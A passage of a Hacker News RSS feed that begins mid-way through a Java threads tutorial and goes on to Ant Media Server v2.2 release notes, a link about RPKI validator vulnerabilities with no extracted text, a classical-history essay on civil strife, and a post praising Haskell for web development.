thread.start();</code></pre><p>Thread lives as long as the its run hook method has not returned. The scheduler can suspend and run the Thread many times. For a thread to execute forever, it needs an infinite loop that prevents it from returning. </p><p><code>Join</code> method allows one thread to wait for the completion of another. This is a simple form of barrier synchronisation.</p><figure><img src="https://turkogluc.com/content/images/2020/10/Screenshot-2020-10-29-at-20.19.19.png"></figure><h3 id="java-thread-types-user-and-daemon-threads">Java Thread Types: User and Daemon Threads</h3><p>When JVM start it contains a single User thread, named Main thread. The main difference between User and Daemon threads are what happens when they exit.</p><ul><li>A user thread continues its lifecycle even if the main thread exits.</li><li>However all Daemon threads terminates when all the user threads exits.</li><li>JVM itself exits when all the user threads has exited.</li></ul><p>Thread class contains boolean <code>daemon</code> field to specify whether the thread is daemon. It can be set at the time of creation by the constructor or by setter method.</p><pre><code>Thread thread = new Thread(getRunnable());
thread.setDaemon(true);
thread.start();</code></pre><p>By default daemon field is false, so most of the Threads that we generate is a User Thread. Threads copy the <code>isDaemon</code> status of the parent threat if it is not specified. Java uses Daemon thread in some places such as <code>ForkJoinPool</code> and <code>Timer</code>. To illustrate we can use the following example:</p><pre><code>public class Main {

    public static void main(String[] args) throws InterruptedException, ExecutionException {
//        runDeamonThread();
        runUserThread();
        System.out.println(getCurrentThreadName() + " exits");
    }

    private static void runDeamonThread() throws ExecutionException, InterruptedException {
        ExecutorService executorService = Executors.newWorkStealingPool(10);
        executorService.execute(getRunnable());
    }

    private static void runUserThread() {
        Thread thread = new Thread(getRunnable());
        thread.start();
    }

    private static Runnable getRunnable() {
        return () -&gt; {
            for (int i = 0; i &lt;= 200; i++) {
                System.out.print(".");
                Thread.yield();
            }
            System.out.println(getCurrentThreadName() + " exits. isDeamon: " + isDaemon());
        };
    }

    private static boolean isDaemon() {
        return Thread.currentThread().isDaemon();
    }

    private static String getCurrentThreadName() {
        return Thread.currentThread().getName();
    }
}</code></pre><ul><li>When we invoke <code>runUserThread</code> method it show the following example output:</li></ul><pre><code>................................................
main exits
........................................................................................
Thread-0 exits. isDeamon: false</code></pre><ul><li>The second case is invoking the <code>runDeamonThread</code> which uses <code>ForkJoinPool</code> as an example of Daemon Threads. I could simply use <code>setDaemon(true)</code> method, but wanted to give an example usage. Output:</li></ul><pre><code>main exits</code></pre><p>So when the main method exits, all the user threads are terminated and JVM exits and kills all daemon threads, so that we did not even have a chance to see output from daemon threads.</p><h3 id="stopping-threads">Stopping Threads</h3><p>Compared to creating, stopping a thread is quite hard thing. Once thread starts running it diverges from the caller and it has it is own lifecycle anymore. It can either complete the task and exits or if it does a long running operation it can work forever. Java does not provides us a method (non-deprecated) to stop the thread voluntarily. </p><ol><li>A naive approach could be using a stop flag:</li></ol><pre><code>volatile boolean isStopped = false;

public void test() {
    new Thread(() -&gt; {
        while (!isStopped) {
            System.out.print(".");
        }
        System.out.println("Child Exits");
    }).start();

    try {
        Thread.sleep(100);
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
    isStopped = true;
    System.out.println("Main exits");
}</code></pre><p>Note that the flag is <code>volatile</code> in order to make its up-to-date value visible for both threads. However this approach fails if the thread is doing blocking operations such as <code>sleep</code>, <code>wait</code>, <code>join</code> or blocking I/O operations.</p><p>2. Another way to stop the tread is to use <code>interrupt()</code> method of the thread. </p><blockquote>An interrupt request to a thread is an indication that it should stop what it is doing and do something else. It is up to the programmer to decide exactly how a thread responds to an interrupt but it is very common for the tread to terminate.</blockquote><p>For the interrupt mechanism to work correctly, the interrupted thread must support its own interruption mechanism. There are 2 cases we can examine for interruption:</p><ul><li>Non Blocking and Long Running Tasks</li></ul><p>In this case calling the <code>thread.interrupt()</code> method will set the interrupt flag of the that thread but if the task itself does not check the status of the interrupted flag it will not have any impact. For example:</p><pre><code>public void test() throws InterruptedException {
    Thread thread = new Thread(() -&gt; {
        System.out.println("Child Starts");
        while (true) {
            System.out.print(".");
        }
    });

    thread.start();
    thread.interrupt();
    
    thread.join();
    System.out.println("Main exits");
}</code></pre><p>In order for the thread to catch the interrupt, it should iteratively check the status of the interrupt flag so that it can understand if there are any pending interruption request and handle the request accordingly. </p><p>So we can check the flag in our while loop in if it is true we can return or break the loop. In the lambda expression it is not possible to throw an exception but in appropriate places we can throw <code>InterruptedException</code> as well.</p><pre><code>public void test() throws InterruptedException {
    Thread thread = new Thread(() -&gt; {
        System.out.println("Child Starts");
        while (true) {
            if (Thread.interrupted()) {
                break;
            }
            System.out.print(".");
        }
        System.out.println("Child exits");
    });

    thread.start();
    thread.interrupt();

    thread.join();
    System.out.println("Main exits");
}</code></pre><p>Note the <code>Thread.interrupted()</code> method returns the value of the flag and clears it if it has been true. So if we want to keep the state of the Thread as interrupted for the upper level of stack, we can set it back with <code>Thread.currentThread().interrupt();</code> </p><ul><li>Blocking Tasks</li></ul><p>If a thread frequently calls the blocking methods such as <code>wait</code>, <code>join</code>, <code>sleep</code>, <code>blocking I/O</code> which are all run interruptively, these methods internally check if they have been interrupted and if so they automatically throw <code>InterruptedException</code>. This exception should be caught and handled in the appropriate context. The following example uses the interruption to break the loop in a blocking <code>sleep</code> operation:</p><pre><code>public void test() throws InterruptedException {
    Thread thread = new Thread(() -&gt; {
        System.out.println("Child Starts");
        try {
            while (true) {
                Thread.sleep(10000);
            }
        } catch (InterruptedException e) {
            System.out.println("Thread interrupted: " + e.getMessage());
        }
        System.out.println("Child Exits");
    });

    thread.start();
    thread.interrupt();

    thread.join();
    System.out.println("Main exits");
}</code></pre><p>There are patterns for dealing with Java <code>InterruptedException</code>:</p><ul><li>One approach is propagating the exception to the callers, so higher layer would be responsible.</li><li>Before re-throwing, we can do task specific clean up.</li><li>If it is not possible to re-throw, we can set the interrupted status to true again with <code>Thread.currentThread().interrupt()</code> to preserve the evidence if the higher layers want to check it.</li></ul><p>So as a conclusion if we want to implement cancellable tasks we need to periodically check the status of the interrupt status and handle the interruption in a way that thread will exit.</p><h3 id="thread-groups">Thread Groups</h3><p>In order to simplify thread management, multiple threads &nbsp;can be organised with <code>java.lang.ThreadGroup</code> objects that group related threads. Each Thread Group needs to have a parent group. In the hierarchy, there is the <code>Main</code> group which is the parent of the other groups or threads we create in the program. We can create <code>ThreadGroup</code> by calling its constructor with a parent group and/or name. To add the Threads in a group we need to specify the group in the Thread's constructor.</p><pre><code>public void test() {
    ThreadGroup tg1 = new ThreadGroup("Thread-group-1");
    ThreadGroup tg2 = new ThreadGroup(tg1, "Thread-group-2");

    Thread thread1 = new Thread(tg1,"thread-1");
    Thread thread2 = new Thread(tg2,"thread-2");
    Thread thread3 = new Thread(tg2,"thread-3");

    thread1.start();
    thread2.start();
    thread3.start();
    
    Thread[] threads = new Thread[tg2.activeCount()];
    tg2.enumerate(threads);

    Arrays.asList(threads).forEach(t -&gt; System.out.println(t.getName()));
    tg1.list();
}</code></pre><p>We can iterate over the threads by calling the <code>enumerate</code> method, which fills the given array with the thread references of the group.</p><p>We can implement a Thread Pool by making use of Thread Groups:</p><pre><code>public class ThreadPool {
    // Create a thread group field
    private final ThreadGroup group = new ThreadGroup("ThreadPoolGroup");
    // Create a LinkedList field containing Runnable
    private final List&lt;Runnable&gt; tasks = new LinkedList&lt;&gt;();

    public ThreadPool(int poolSize) {
   …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://turkogluc.com/java-concurrency-basics-of-threads/">https://turkogluc.com/java-concurrency-basics-of-threads/</a></em></p>]]>
            </description>
            <link>https://turkogluc.com/java-concurrency-basics-of-threads/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940545</guid>
            <pubDate>Fri, 30 Oct 2020 09:32:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CMAF is available in Ant Media Server v2.2]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24940533">thread link</a>) | @kerrarbone
<br/>
October 30, 2020 | https://antmedia.io/cmaf-is-available-in-ant-media-server-v2-2/ | <a href="https://web.archive.org/web/*/https://antmedia.io/cmaf-is-available-in-ant-media-server-v2-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>We’re happy to announce that Ant Media Server v2.2 is out with CMAF support. Before giving more highlights for the new version, just let us thank all you guys out there that make Ant Media Server become a worldwide product in 121 countries. It’s great to help lots of people around the world for their video streaming projects. After this introduction, let me give the highlights for the v2.2.</p>
<h2>Low Latency (CMAF) vs. Ultra Low Latency (WebRTC)</h2>
<p>Ant Media Server right now supports both LL(CMAF) and ULL(WebRTC). Here is the some basic information about these technologies. CMAF provides low latency(3-5 secs) in live streaming, on the other hand WebRTC provides Ultra Low Latency(0.5 secs) in live streaming. Then which one is good for your streaming project, CMAF or WebRTC?</p>
<h4>Which one to use?</h4>
<p>Both technologies have advantages and disadvantages. You can pick the correct one according to your use case.&nbsp; CMAF is good if there is no interactivity between broadcasters and viewers. It’s easier to scale with CMAF with CDNs.&nbsp; It’s not much affected by instant network fluctuations because latency is about 3-5 seconds. On the other hand,&nbsp; it’s good to use WebRTC if there is interactivity between broadcasters and viewers. You need to manage the edge WebRTC servers to scale.&nbsp; It’s affected by instant network fluctuations(jitter, congestion) because it’s about 0.5 secs latency.</p>
<div id="attachment_34297"><p><img aria-describedby="caption-attachment-34297" src="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/Chunked-encoding-slide-CMAF.png" alt="CMAF" width="626" height="347" srcset="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/Chunked-encoding-slide-CMAF.png 626w, https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/Chunked-encoding-slide-CMAF-300x166.png 300w, https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/Chunked-encoding-slide-CMAF-600x333.png 600w" sizes="(max-width: 626px) 100vw, 626px" title="Adventure Continues: CMAF is available in Ant Media Server v2.2 1"></p><p id="caption-attachment-34297">CMAF</p></div><h4>How to use CMAF?</h4>
<p>Firstly, you need to enable it on your application’s configuration file. Let’s assume that you’ve already running Ant Media Server v.2.2 Enterprise on your server then we’re going to use WebRTCAppEE for CMAF streaming.</p>
<ul>
<li>Open the following file with your favorite editor <pre>/usr/local/antmedia/webapps/WebRTCAppEE/WEB-INF/red5-web.properties</pre> </li>
<li>Enable DASH by adding following property to the file above <pre>settings.dashMuxingEnabled=true</pre> </li>
<li>Restart the Ant Media Server <pre>sudo service antmedia restart</pre> </li>
<li>Send WebRTC stream to Ant Media Server on WebRTC publisher page. Let’s assume your stream id is “stream1” <pre>https://YOUR_DOMAIN:5443/WebRTCAppEE</pre> </li>
<li>Play the stream with CMAF on the following url <pre>https://YOUR_DOMAIN:5443/WebRTCAppEE/play.html?id=stream1&amp;playOrder=dash</pre> </li>
</ul>
<p>Measure the latency. You’ll see something between 3-5 secs. Let us give further configuration parameters for DASH muxing.</p>
<ul>
<li><em>settings.dashSegDuration </em>: Duration of segments in DASH. Default value is 2</li>
<li><em>settings.dashFragmentDuration </em>: Duration of fragments. Default value is 0.5</li>
<li><em>settings.dashTargetLatency </em>: Target latency for measurement. Default value is 3.5.</li>
<li><em>settings.dashWindowSize </em>:&nbsp; DASH window size. Number of files in manifest. Default value is 5</li>
<li><em>settings.dashExtraWindowSize </em>: DASH extra window size. Number of segments kept outside of the manifest before removing from disk. Default value is 5</li>
<li><em>settings.deleteDASHFilesOnEnded </em>: Delete DASH files after streaming is ended.&nbsp; Default value is true</li>
</ul>
<h2>Kubernetes Support</h2>
<p>We’ve been getting requests for supporting Kubernetes(K8s) from our users for a while. So that we’ve decided to support Kubernetes in Ant Media Server. We’ve added extra parameters to start the server in the container.</p>
<div id="attachment_34272"><p><img aria-describedby="caption-attachment-34272" src="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/kubernetes.png" alt="Adventure Continues: CMAF is available in Ant Media Server v2.2 1" width="600" height="300" srcset="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/kubernetes.png 600w, https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/kubernetes-300x150.png 300w" sizes="(max-width: 600px) 100vw, 600px" title="Adventure Continues: CMAF is available in Ant Media Server v2.2 2"></p><p id="caption-attachment-34272">Kubernetes is supported in Ant Media Server</p></div><p>Moreover, we’ve prepared the documentation for the Kubernetes. All kubernetes files(service, deployment) and dockerFile are available <a href="https://github.com/ant-media/Ant-Media-Server/wiki/Getting-Started-with-Ant-Media-Server-Kubernetes" target="_blank" rel="noopener">in the documentation.</a> The critical thing for running Ant Media Server is that deployment uses hostNetwork which means that you can use one Ant Media Server pod in a node.</p>
<h2>Long live the new King: Java 11</h2>
<p>We don’t mean the “The king is dead” because Java 8 is still the most used Java version. On the other hand, for compatibility with tools and improvements in Java 11, we’ve migrated to Java 11 in Ant Media Server. In addition, we’ve monitored some performance improvements on Java 11. We plan to provide more performance metrics for this release later.&nbsp; All install scripts and docker files are updated to use Java 11.</p>
<div id="attachment_34273"><p><img aria-describedby="caption-attachment-34273" src="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/java_11.png" alt="Java 11 is supported in Ant Media Server" width="400" height="225" srcset="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/java_11.png 400w, https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/java_11-300x169.png 300w" sizes="(max-width: 400px) 100vw, 400px" title="Adventure Continues: CMAF is available in Ant Media Server v2.2 3"></p><p id="caption-attachment-34273">Ant Media Server v2.2 is running in Java 11</p></div><h2>Apache Portable Runtime(APR) and HTTP/2</h2>
<p>We’ve updated Tomcat version to 8.5.58 and compiled native Apache Portable Runtime libraries for improving the performance. <span>Tomcat can use the&nbsp;</span><a href="https://apr.apache.org/" rel="nofollow noopener" target="_blank">Apache Portable Runtime</a><span> to provide superior scalability, performance, and better integration with native server technologies. Last but not the least, we’ve also enabled HTTP/2.0 in Ant Media Server.</span></p>
<p><img src="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/http_2.png" alt="Adventure Continues: CMAF is available in Ant Media Server v2.2 2" width="280" height="280" srcset="https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/http_2.png 280w, https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/http_2-150x150.png 150w, https://i0.wp.com/antmedia.io/wp-content/uploads/2020/10/http_2-160x160.png 160w" sizes="(max-width: 280px) 100vw, 280px" title="Adventure Continues: CMAF is available in Ant Media Server v2.2 4"></p>
<p>If you want to take a look at the whole changes, please <a href="https://github.com/ant-media/Ant-Media-Server/releases/tag/ams-v2.2.0" rel="follow noopener" target="_blank">visit this link</a>.</p>
<p>We continue our adventure to create something challenging and unique in the upcoming versions and projects(Spaceport – Volumetric Video).</p>
<p><a href="https://antmedia.io/#contact">Please keep in touch if we can help you with anything.</a></p>
</div></div>]]>
            </description>
            <link>https://antmedia.io/cmaf-is-available-in-ant-media-server-v2-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940533</guid>
            <pubDate>Fri, 30 Oct 2020 09:28:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Critical security vulnerabilities in many RPKI validators (Job Snijders)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940518">thread link</a>) | @pjf
<br/>
October 30, 2020 | http://sobornost.net/~job/manifest_handling_issue.txt | <a href="https://web.archive.org/web/*/http://sobornost.net/~job/manifest_handling_issue.txt">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://sobornost.net/~job/manifest_handling_issue.txt</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940518</guid>
            <pubDate>Fri, 30 Oct 2020 09:24:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The fragility of self-government in classical Europe – Bret Devereaux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24940298">thread link</a>) | @daddylonglegs
<br/>
October 30, 2020 | https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Hey folks!  Fireside this week, but I promise we’ll see that promised addendum on pre-modern crucible steel and cast iron next week.  In the meantime, as you are no doubt inescapably aware, the United States (where I live) is having an election.  I mostly avoid politics itself on this blog and that’s something I intend to keep doing, but I thought that this particular moment was a good time to explain how my studies influence my own political thinking.  After all, I went on about how<a href="https://acoup.blog/2020/07/03/collections-the-practical-case-on-why-we-need-the-humanities/"> “men have no more ready corrective of conduct than knowledge of the past”</a> (Plb. 1.1.1), so with a momentous decision to be made, I thought I would talk about about how that ready corrective influences my own conduct as a citizen.</p>



<figure><img data-attachment-id="4924" data-permalink="https://acoup.blog/img_20200305_192249/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg" data-orig-size="2909,2387" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1583436169&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1038&quot;,&quot;shutter_speed&quot;:&quot;0.066683&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_20200305_192249" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/10/img_20200305_192249.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>For those worried that this blog too will slip down into the grasping black hole that is American politics, worry note: this will not be a regular occurrence.  As normal, I’ll have some recommendations on things to read and listen to (history and national security, not politics) at the end.</p>



<p>Also, in the name of my sanity, I am going to go ahead and disable comments on this post rather than invite an angry political discussion which might well lead to unkind words being said from one reader to the next (I am quite OK with people saying unkind words about me – I’m on twitter, after all – but I’d rather not have a civil war in my comments) or invite the swarm of internet trolls to descend upon our fair little community here.  If you do want to discuss the recommendations, <a href="https://acoup.blog/2020/10/23/things-you-might-have-missed-october-21-2020/">let’s all agree to go do that in last week’s post’s comments</a>.</p>



<p>On with the show!</p>



<p>One thing that emerges quite clearly from a study of Greek and Roman antiquity is the<strong> intense fragility of self-government</strong>.  That fragility is easy to miss in a modern context (to the point that it is occasionally argued that so-called ‘<a href="https://en.wikipedia.org/wiki/Democratic_consolidation">consolidated</a>‘ democracies are self-sustaining) in part because the sample size is so small and recent, relatively speaking.  By some measures, the United States is, in fact, the <a href="https://www.politifact.com/factchecks/2016/jul/11/paul-ryan/paul-ryan-claims-us-oldest-democracy-world-he-righ/">world’s oldest current democracy </a>at just 232 years. In practice, the German democracy is about 65 years old (and only 30 years fully united); the Fifth French Republic is even younger, just 62 (though if we want to count from the beginning of the Third Republic, we get a more impressive 150 years). The great majority of democracies are even younger. Moreover, there just aren’t that many of them; <a href="https://en.wikipedia.org/wiki/Democracy_Index">the Democracy Index </a>figures there are only 76 democracies currently, out of 167 states it tracks and that’s very near to the highest the number has ever been.</p>



<p><strong>The ancient sample-set is much more robust! </strong> For much of the last millennium B.C., Greece and Italy (not merely Rome, but the array of other similarly structured Italic communities) were <em>filled</em> with small self-governing communities of citizens. I don’t want to get into the weeds of how democratic these states were, or their government structure, or we will be here all week. Needless to say, there is a <em>very robust</em> argument about that topic among ancient historians that continues to this day (I’ll toss some bibliography on the topic at the end). What matters here is that these self-governing communities were just that: <em>self</em>-governing, with a citizen body that largely governed itself, by more-or-less democratic means in governments that were more-or-less republics (in our modern sense of the term).</p>



<p><strong>And it is in observing that sample that it becomes clear that these systems of government can be very fragile</strong> <strong>internally</strong>.  Patterns also emerge as to how such systems break down.  The cycle of breakdown was sufficiently common that the Greeks had a nice, compact word for it: <em>stasis</em> (στάσις, pronounced STAH-sis, not STAY-sis.  The nearest Latin equivalent is <em>factio</em>, but Roman authors – especially Cicero – also translate <em>stasis</em> as <em>seditio</em>).  At its root, a <em>stasis</em> was ‘a standing’ (the ‘sto-‘ root to mean ‘stand’ is common in many Indo-European languages), but rather than our word stasis (from the same root) which meant a standing <strong>still</strong>, <em>stasis</em> came to mean a ‘standing together’ and from there a ‘faction’ or political party, and then ‘factionalism’ and finally from that meaning, ‘civil strife’ and even ‘revolution.’</p>



<p><em>Stasis</em> began in the normal political rivalries and competition within the self-governing community, almost always, in the Greek or Roman context, breaking down on wealth and status lines, with the more numerous, but poorer, common citizenry pushing for a larger role and greater rights within the community, resisted by the elite who argued for the importance of ‘traditional’ government (which may or may actually have been traditional or legal – Roman aristocrats spent 133 BC arguing for their ‘traditional right’ to lease patently illegal – for once the Romans had written this law down – amounts of state lands at artificially low prices) and their own traditional prerogatives.</p>



<p>That said often – as with our current politics – those political factions were not as neat as that description suggests, with some wealthy elites allying themselves (cynically or sincerely) with the faction of ‘the People,’ while at the same time, a great many clients, middling farmers and regular people clearly supported the factions of ‘the few’ or ‘the best’ or whatever the more oligarchic faction called itself.  After all, all of those <em>optimates</em> Roman senators had to <em>get into the Senate</em> (by winning election to at least the <a href="https://en.wikipedia.org/wiki/Quaestor">quaestorship</a>) somehow; somebody voted for them!  Thucydides, in describing <em>stasis</em>, makes it quite clear that members even of the same families might often end up on opposite sides of civil strife.</p>



<p><strong>Of course, such negotiations of power are the basis of politics and were nothing new. </strong> What changes as a community lurched towards <em>stasis</em> was the steady erosion of the norms, traditions and simple restraint that made self-government possible.  This process was obvious enough – with so many examples – that it is explained and discussed in a number of the ancient sources (most notably Thuc. 3.82-86, but note also Hdt. 1.59; Plb. 6.3.9-13; Arist. <em>Ath. Pol</em>. 2, 5, 13; Plut. <em>Sol</em>. 13, 29).  Simply put, the two political factions would be locked in a cycle of escalation, neither willing to compromise but rather using the previous outrages of the other faction to justify the future outrages of their own faction.  Thucydides notes how this had a sorting effect, “until even blood became a weaker tie than party” (Thuc. 3.82.6).</p>



<p><strong>That escalation damaged the essential social trust that allowed the society to function</strong> (and violence damaged the prosperity which made competition even fiercer). <strong> The decline of trust makes the ‘trap’ of <em>stasis</em> self-reinforcing: as trust declines and more decisions are made as cynical calculations </strong>(Thuc. 3.82.1-3) it becomes harder and harder to broker a deal to end the strife that all sides will trust and respect, particularly because <em>stasis</em> tended first to cannibalize any moderate figures or factions.  The endpoint, of course, was self-destructive violence as the last limits and norms broke under the weight of escalating competition. <strong> The most common result of that violence was the emergence of tyranny – one man strongman rule, although sometimes (typically with foreign support) one faction would ‘win’ and massacre their opponents – their usual reward was becoming an exploited puppet government to a self-interested outside power; they had merely exchanged a domestic tyrant for a foreign one</strong>.    That ancient authors could present a <strong><em>system</em> </strong>to <em>stasis</em> speaks to how relatively often it happened – from the sources it certainly seems like, with so many small Greek and Italian states, at least one of them was going through <em>stasis</em> at one point or another.</p>



<p><strong>But in that large sample size, we also get a sense of what solutions succeed and what solutions fail to hold together a self-governing community in these sorts of pressures</strong>.  Beset by repeated political crises from 494 to 287 (known as the <a href="https://en.wikipedia.org/wiki/Conflict_of_the_Orders">Struggle of the Orders</a>), the Roman Republic repeatedly survived and grew stronger through <strong>compromise and by constructive, inclusive redefinition</strong> of the republic to include a broader range of people (not merely the patrician elite, but also the plebeian elite).  In no small part, that success seems to have been motivated by the avowed need of elite patricians for the support of the plebeian commons in order to campaign, since the plebeians made up most of the army.</p>



<p>In stark contrast, the effort by conservative (in the general sense, not in the American sense) elements of the Roman senate to ‘hold the line’ and permit no compromise on questions of land reform and citizenship in the Late Republic led quite directly to the outbreak of civil war in 91 (with the Italian allies) and in 88 (between Romans) and consequently to the collapse of the Republic.  Initially, the influence and raw power of the elite was sufficient to squash efforts at reform (including the murder of <a href="https://en.wikipedia.org/wiki/Gracchi">some prominent reformers</a>), but in the long run the discontent those crackdowns created laid the fertile ground for the rise of demagogic military leaders to supplant the Republic entirely, culminating in first Caesar and then Octavian doing just that.  <strong>In an effort to compromise on nothing, the Roman elite lost <em>everything</em>.</strong></p>



<p>The Greek experience offers a similar lesson.  Thucydides presents a quite moving passage describing the destructiveness of <em>stasis</em> which stresses that – again and again, because this cycle repeated itself in many <em>poleis</em>, being a common feature of systems of self-government – <strong>efforts by one faction within a <em>polis</em> community to ‘win’ the conflict merely led to the decay of moderation and the laws</strong>;<strong> there were no victors in <em>stasis</em>, only survivors</strong>.  The continued <em>stasis</em> was so destructive that ‘winning’ merely left the badly weakened <em>polis</em> easy prey for the malign influence of outside powers.  It turns out the point at which you “get tired of winning” is roughly the point that your domestic <em>stasis</em> makes …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940298</guid>
            <pubDate>Fri, 30 Oct 2020 08:39:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24940075">thread link</a>) | @_query
<br/>
October 30, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
